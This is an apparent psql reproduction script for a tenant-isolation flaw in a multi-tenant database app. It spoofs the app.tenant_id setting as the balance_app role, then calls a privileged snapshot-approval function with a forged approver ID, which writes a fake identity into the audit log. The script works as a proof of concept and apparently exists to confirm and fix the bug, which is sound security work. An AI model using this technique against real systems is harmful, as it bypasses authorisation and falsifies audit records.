-- ============================================================
-- reproduce-attack.sql — Reproduce the Migration 30 vulnerability
-- ------------------------------------------------------------
-- Demonstrates that a balance_app caller can:
--   1. Spoof app.tenant_id to ANY tenant (including the lead of a coordination
--      they are NOT a participant in)
--   2. Call approve_coordination_shared_snapshot() directly with arbitrary
--      p_approver_id, p_tenant_id parameters
--   3. Approve a snapshot they have NO authorization to approve
--   4. Record a FORGED approver identity in the audit log
--
-- Run as: psql -h ... -U postgres -d balance -f reproduce-attack.sql
-- (postgres superuser is needed to SET ROLE balance_app)
-- ============================================================

\set ON_ERROR_STOP off
\echo '============================================================'
\echo 'STEP 1: Setup — create target snapshot owned by Tenant A'
\echo '============================================================'

-- Clean up any prior test artifacts (note: column is "snapshotId" not "snapshot_id")
DELETE FROM reform_coordination_shared_snapshot_revocations WHERE "snapshotId" IN (
  SELECT id FROM reform_coordination_shared_snapshots WHERE title = 'ATTACK_TARGET_SNAPSHOT'
);
DELETE FROM reform_coordination_shared_snapshots WHERE title = 'ATTACK_TARGET_SNAPSHOT';
DELETE FROM audit_log WHERE action = 'reform.coordination.snapshot_approved'
  AND details->>'snapshotId' IN (
    SELECT id::text FROM reform_coordination_shared_snapshots WHERE title = 'ATTACK_TARGET_SNAPSHOT'
  );

-- Create the target snapshot using plpgsql (as postgres superuser, BYPASSRLS)
DO $$
DECLARE
  v_tenant_a TEXT;
  v_coord_id TEXT;
BEGIN
  SELECT id INTO v_tenant_a FROM tenants WHERE code = 'DML-MOP-TENANT';
  IF v_tenant_a IS NULL THEN
    RAISE EXCEPTION 'Tenant A (DML-MOP-TENANT) not found — run seed first';
  END IF;

  SELECT id INTO v_coord_id FROM reform_coordinations
  WHERE "leadTenantId" = v_tenant_a LIMIT 1;
  IF v_coord_id IS NULL THEN
    RAISE EXCEPTION 'No coordination where Tenant A is lead — run seed first';
  END IF;

  INSERT INTO reform_coordination_shared_snapshots (
    id, "coordinationId", "ownerTenantId", "snapshotType", title, summary,
    status, "submittedAt", "createdBy", "createdAt", "updatedAt"
  ) VALUES (
    gen_random_uuid()::text, v_coord_id, v_tenant_a, 'custom', 'ATTACK_TARGET_SNAPSHOT',
    'Snapshot that will be the target of the spoofing attack.',
    'draft', NOW(), 'seed-attack-repro', NOW(), NOW()
  );
END $$;

\echo 'Target snapshot created.'

-- Capture the snapshot ID + lead tenant ID (as postgres, BEFORE SET ROLE)
\gset
SELECT id AS target_snapshot_id,
       (SELECT c."leadTenantId"
        FROM reform_coordination_shared_snapshots s
        JOIN reform_coordinations c ON c.id = s."coordinationId"
        WHERE s.title = 'ATTACK_TARGET_SNAPSHOT' LIMIT 1) AS lead_tenant_id
FROM reform_coordination_shared_snapshots
WHERE title = 'ATTACK_TARGET_SNAPSHOT' LIMIT 1
\gset

\echo 'Target snapshot ID: ' :target_snapshot_id
\echo 'Lead tenant ID:    ' :lead_tenant_id

\echo ''
\echo '============================================================'
\echo 'STEP 2: Attack — connect as balance_app, SPOOF app.tenant_id,'
\echo '         call approve_coordination_shared_snapshot directly'
\echo '============================================================'

-- Switch to balance_app role (simulates a balance_app DB connection)
SET ROLE balance_app;

-- SPOOF app.tenant_id to the lead tenant's ID (attacker controls this!)
-- Use is_local=false (session-level) so the GUC persists across SQL statements
-- (simulating the app's withAuthenticatedTenant which sets it per-transaction)
SELECT set_config('app.tenant_id', :'lead_tenant_id', false);

\echo 'Spoofed app.tenant_id to lead tenant. Now calling the function...'

-- Call the privileged function DIRECTLY with a FORGED approver_id
-- The function's internal check (p_tenant_id = current_setting('app.tenant_id'))
-- passes trivially because the attacker controls BOTH values.
SELECT approve_coordination_shared_snapshot(
  :'target_snapshot_id'::text,
  'FORGED_ATTACKER_USER_ID'::text,   -- attacker chooses ANY user ID
  :'lead_tenant_id'::text,            -- must match the spoofed GUC (trivial)
  'Attacker-supplied notes'::text
) AS attack_result;

\echo ''
\echo '============================================================'
\echo 'STEP 3: Verify the attack succeeded'
\echo '============================================================'

RESET ROLE;

-- Check the snapshot status
SELECT id, status, "approvedBy", "approvedAt"
FROM reform_coordination_shared_snapshots
WHERE title = 'ATTACK_TARGET_SNAPSHOT';

-- Check the audit log
SELECT id, actor, action, details->>'snapshotId' AS snapshot_id, status, "at"
FROM audit_log
WHERE action = 'reform.coordination.snapshot_approved'
  AND details->>'snapshotId' = :'target_snapshot_id'
ORDER BY "at" DESC LIMIT 3;

\echo ''
\echo '============================================================'
\echo 'VULNERABILITY CONFIRMED if:'
\echo '  - snapshot status = ''approved'''
\echo '  - approvedBy = ''FORGED_ATTACKER_USER_ID'''
\echo '  - audit_log actor = ''FORGED_ATTACKER_USER_ID'''
\echo '============================================================'
